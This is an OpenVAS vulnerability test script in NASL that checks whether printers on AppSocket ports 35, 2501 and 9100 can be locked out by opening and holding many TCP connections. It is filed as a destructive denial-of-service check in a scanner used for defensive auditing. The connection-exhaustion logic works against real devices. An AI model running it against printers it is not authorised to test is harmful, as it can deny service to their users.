# OpenVAS Vulnerability Test
# $Id: appsocket_DoS.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: AppSocket DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It seems that it is possible to lock out your printer from the
network by opening a few connections and keeping them open.

** Note that the AppSocket protocol is so crude that OpenVAS
** cannot check if it is really running behind this port.";

tag_solution = "Change your settings or firewall your printer";

if(description)
{
 script_id(11090);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_tag(name:"cvss_base", value:"9.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
 script_tag(name:"qod_type", value:"remote_banner_unreliable");
 name = "AppSocket DoS";
 script_name(name);
 

 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Denial of Service";
 script_family(family);
 script_dependencies("find_service.nasl");
 script_require_ports(35, 2501, 9100);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

function test_app_socket(port)
{
  #display("Testing port ", port, "\n");
  if (! get_port_state(port)) return(0);

  soc = open_sock_tcp(port);
  if (! soc) return(0);

  # Don't close...
  s[0] = soc;

  for (i = 1; i < 16; i = i+1)
  {
    soc = open_sock_tcp(port);
    if (! soc)
    {
      security_message(port);
      for (j = 0; j < i; j=j+1) close(s[j]);
      return(1);
    }
    sleep(1);	# Make inetd (& others) happy!
    s[i] = soc;
  }
  for (j = 0; j < i; j=j+1) close(s[j]);
  return (0);
}

test_app_socket(port: 35);
test_app_socket(port: 2501);
test_app_socket(port: 9100);

